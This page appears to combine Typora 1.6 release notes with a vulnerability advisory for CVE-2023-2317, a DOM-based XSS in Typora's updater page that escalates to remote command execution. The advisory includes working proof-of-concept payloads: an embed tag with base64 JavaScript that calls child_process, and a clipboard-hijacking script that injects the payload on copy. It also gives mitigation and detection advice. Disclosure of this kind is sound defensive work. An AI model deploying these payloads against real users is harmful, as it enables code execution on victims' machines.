May 22, 2023
by
typora.io

> From this version, Windows 7, 8, 8.1 are no longer supported. For older Windows support, [please check here](/Older-Windows-Support/).

## “Files” Section in Preferences Panel

In this version, we rearranged groups in Preferences Panel, and added a new group “Files” in Preferences Panel for files related configs.

![CleanShot 2023-05-10 at 21.45.48@2x](/media/new-1.6/new-preferences.png)

Some new options are added:

1. Typora now allow user to set default file extensions when save file or add new file in files sidebar.
2. Typora now allow user to config actions when drop file or folders into Typora, currently it provides following two options:
   * Open or import the file / folder in Typora
   * Insert a file link into Typora

## Options to Disable Auto Links

You can now config whether Typora should auto recognize and render links from `Preferences Panel` → `Markdown` → `Syntax Support`.

* When **Auto Links is disabled**, links like `https://typora.io` or `mailto:[[email protected]](/cdn-cgi/l/email-protection)` in the markdown document will NOT rendered as <ttps://typora.io> or [[email protected]](/cdn-cgi/l/email-protection#2c595f495e6c49544d415c4049024f4341).

  But you can use syntax like `[title](url)` or `<url>` to insert links.
* When **Auto Links is enabled**, links like `https://typora.io` or `mailto:[[email protected]](/cdn-cgi/l/email-protection)` in the markdown document will rendered as <ttps://typora.io> or [[email protected]](/cdn-cgi/l/email-protection#443137213604213c25293428216a272b29) automatically.

## Default Code Language

You can now set default code language for code blocks from `Preferences Panel` → `Code Fences`.

![Screenshot 2023-05-25 at 10.51.51](/media/code/default-lang.png)

And Typora provides some apply options:

* Apply default code language when add code fences from menubar, context menu, or from shortcut keys.
* Apply default code language when add code fences by input markdown syntax `````. You can press **Backspace** key or **Undo** to delete auto applied code language.
* Apply in both cases.

| Auto Apply Code Language for Code Blocks inserted from menu | Auto Apply Code Language for Code Blocks inserted from Markdown |
| --- | --- |
|  |  |

You can also choose **Last Used** to auto apply last used code language when insert new code blocks.

## Timeline Diagram

Typora now upgrade mermaid library to version 10, and [timeline diagram](https://mermaid.js.org/syntax/timeline.html) is now supported.

![Screenshot 2023-05-10 at 22.46.25](/media/new-1.6/Screenshot 2023-05-10 at 22.46.25.png)

We also added a link for diagram configurations in `Preferences Panel` → `Markdown` → `Syntax Support` → `Diagrams`.

## Other Changes

### Thai Language Support

Typora now speaks Thai, thanks to [ARMnunf](https://github.com/ARMnunf)!

## Product Overview:[#](#product-overview)

Typora is a popular cross-platform markdown editor that allows users to create and edit markdown files with a real-time preview feature. It supports various formatting options such as headings, bold, italics, and more. Typora also allows users to export their markdown files to different formats such as PDF, HTML, and Word.

Typora for Windows/Linux is built on Electron, a framework that enables it to run seamlessly on various operating systems. The markdown editor supports HTML tags and embedding external webpages. An attacker can use the vulnerability to execute arbitrary JavaScript code and system commands by loading a crafted URL in the markdown editor.

## Vulnerability Summary:[#](#vulnerability-summary)

There is a DOM-based XSS in Typora for Windows/Linux, allowing arbitrary JavaScript code to run in the context of Typora main window. This vulnerability can be exploited if a user opens a malicious markdown file in Typora, or copies text from a malicious webpage and paste it into Typora.

## Vulnerability Details:[#](#vulnerability-details)

An DOM-based XSS has been found in `Typora/resources/updater/updater.html`:

```
    <div class="btn-group">
      <div id="skip-this-version-btn-group" style="flex-grow: 2; min-height: 10px;min-width: 10px;">
        <button onClick="onSkipUpdate()" data-label="1" >Skip This Version</button>
      </div>

      <button onClick="onCancelUpdate()" data-label="2" >Remind Me Later</button>
      <button class="btn-primary" onClick="onDownloadUpdate()" data-label="3" >Download Update</button>
    </div>
    <script type="text/javascript">
      // ...
      var labels = JSON.parse(decodeURIComponent(/[?&]labels=([^&]+)/.exec(window.location.search)[1]));        // [1]
      document.querySelector("#sum").innerText = labels[4] + " " + labels[5].replace("$1", newVersion).replace("$2", curVersion);
      document.querySelectorAll("[data-label]").forEach(function(dom){
        dom.innerHTML = labels[dom.getAttribute("data-label") - 0];     // [2]
      });
      // ...
    </script>

```

In the code snippet above, variable `labels` is extracted from `location.search` at `[1]`, and later assigned to `innerHTML` of elements with `data-label` attributes at `[2]`.

Here is a PoC injecting an `<input>` tag into the DOM:

```
updater.html?curVersion=1&newVersion=2&releaseNoteLink=3&hideAutoUpdates=false&labels=["<input%20value=test>","22","33","44","55","66","77"]

```

![](/advisories/23/images/CVE-2023-2317_01.updater-html-DOM-XSS.png)

Typora registered a file handler `typora://` to load local resources. For example, the URL of the main window is `typora://app/typemark/window.html`, and the actual file is loaded from `[Typora Installation Absolute Path]/resources/window.html`.

It is possible for attacker to load the vulnerable updater.html inside an `<embed>` tag by setting the `src` attribute to `typora://app/typemark/updater/updater.html`. In this case, `typora://app/typemark/window.html` loaded in the main window, and the embedded updater page, are considered same-origin. Thus, updater is able to access privileged interfaces exposed to the main window, such as `reqnode`.

![](/advisories/23/images/CVE-2023-2317_02.updater-and-main-window-are-same-origin.png)

By embedding an updater.html URL with crafted DOM-XSS payload, an attacker is able to execute arbitrary JavaScript code on the main window. Further more, the attacker can use privileged interface `reqnode` in main window to gain access to the node module `child_process` and execute arbitrary system command.

## Exploit Conditions:[#](#exploit-conditions)

This vulnerability can be exploited by convicing the victim to (1) open a malicious markdown file in Typora, or (2) copy text from a malicious webpage and paste it into Typora.

## Proof-of-Concept:[#](#proof-of-concept)

We have tried our best to make the PoC as portable as possible. The following HTML code is a PoC demonstrating this arbitrary file disclosure vulnerability:

```
<embed src="typora://app/typemark/updater/updater.html?curVersion=111&newVersion=222&releaseNoteLink=333&hideAutoUpdates=false&labels=[%22%22,%22%3csvg%2fonload=top.eval(atob('cmVxbm9kZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoKHtXaW4zMjogJ25vdGVwYWQgJVdJTkRJUiUvd2luLmluaScsIExpbnV4OiAnZ25vbWUtY2FsY3VsYXRvciAtZSAiVHlwb3JhIFJDRSBQb0MiJ30pW25hdmlnYXRvci5wbGF0Zm9ybS5zdWJzdHIoMCw1KV0p'))><%2fsvg>%22,%22%22,%22%22,%22%22,%22%22]"></embed>

```

The base64-encoded part in the PoC is decoded to the following content:

```
reqnode('child_process').exec(({Win32: 'notepad %WINDIR%/win.ini', Linux: 'gnome-calculator -e "Typora RCE PoC"'})[navigator.platform.substr(0,5)])

```

When this PoC is loaded in Typora, it will:

1. Load updater.html with DOM-XSS Payload
2. The payload executes JavaScript code on main window
3. Execute system command: `notepad` on Windows, or `gnome-calculator` on Linux

## Attack Scenario:[#](#attack-scenario)

### Scenario 1: Open a malicious markdown file[#](#scenario-1-open-a-malicious-markdown-file)

An attacker can inject an embed tag in a markdown file and convince the victim to open it in Typora to trigger the payload.

We have attached `poc/typora-1.5.12-rce.md` with this report for demonstration. Open the file in affected version of Typora to verify this vulnerability.

Here are GIFs showing this scenario on Windows and Ubuntu:

![](/advisories/23/images/CVE-2023-2317_03.open-file-on-Windows.gif)

![](/advisories/23/images/CVE-2023-2317_04.open-file-on-Ubuntu.gif)

### Scenario 2: Copy and paste from a webpage[#](#scenario-2-copy-and-paste-from-a-webpage)

An attacker can craft a malicious webpage and hook on the `copy` event with the following code:

```
<script>
    document.addEventListener('copy',e=>{
        e.preventDefault();
        let payload = atob('JiN4M2M7ZW1iZWQgc3R5bGU9ImhlaWdodDowOyIgc3JjPSJ0eXBvcmE6Ly9hcHAvdHlwZW1hcmsvdXBkYXRlci91cGRhdGVyLmh0bWw/Y3VyVmVyc2lvbj0xMTEmbmV3VmVyc2lvbj0yMjImcmVsZWFzZU5vdGVMaW5rPTMzMyZoaWRlQXV0b1VwZGF0ZXM9ZmFsc2UmbGFiZWxzPVslMjIlMjIsJTIyJTNjc3ZnJTJmb25sb2FkPXRvcC5ldmFsKGF0b2IoJ2NtVnhibTlrWlNnblkyaHBiR1JmY0hKdlkyVnpjeWNwTG1WNFpXTW9LSHRYYVc0ek1qb2dKMjV2ZEdWd1lXUWdKVmRKVGtSSlVpVXZkMmx1TG1sdWFTY3NJRXhwYm5WNE9pQW5aMjV2YldVdFkyRnNZM1ZzWVhSdmNpQXRaU0FpVkhsd2IzSmhJRkpEUlNCUWIwTWlKMzBwVzI1aGRtbG5ZWFJ2Y2k1d2JHRjBabTl5YlM1emRXSnpkSElvTUN3MUtWMHAnKSk+PCUyZnN2Zz4lMjIsJTIyJTIyLCUyMiUyMiwlMjIlMjIsJTIyJTIyXSI+JiN4MGQ7JiN4MGQ7');
        e.clipboardData.setData('text/markhtml', `\x20\x0d\x0a\x0d\x0a` + payload + window.getSelection());
        console.log(payload + window.getSelection())
    })
</script>

```

When the victim copies text from this page, the payload is added to the copied content and will be triggered when it is pasted into Typora.

![](/advisories/23/images/CVE-2023-2317_06.copy-paste-on-Ubuntu.gif)

We have attached `poc/rce-cp.html` as PoC of this scenario. A live version can also be found [here](https://o.cal1.cn/f0a97fdef8028595-typora-poc/rce-cp.html).

### Additional Notes:[#](#additional-notes)

1. It is possible for attackers to set custom styles on the `<embed>` tag to make the exploit less noticeable. For instance, `height:0;` is used in the Scenario 2 PoC to hide the embedded webpage.

## Suggested Mitigations:[#](#suggested-mitigations)

It is recommended to update HTML elements by setting `innerText` instead of `innerHTML`.

For end users who are using the versions affected by this vulnerability, it is suggested that (1) any untrusted markdown file should not be opened in Typora, and (2) copying text from an untrusted webpage then pasting it into Typora should be avoided.

## Detection Guidance:[#](#detection-guidance)

It is possible to detect the exploitation of this vulnerability by checking the presence of `embed` tags loading suspicious URLs in markdown files.
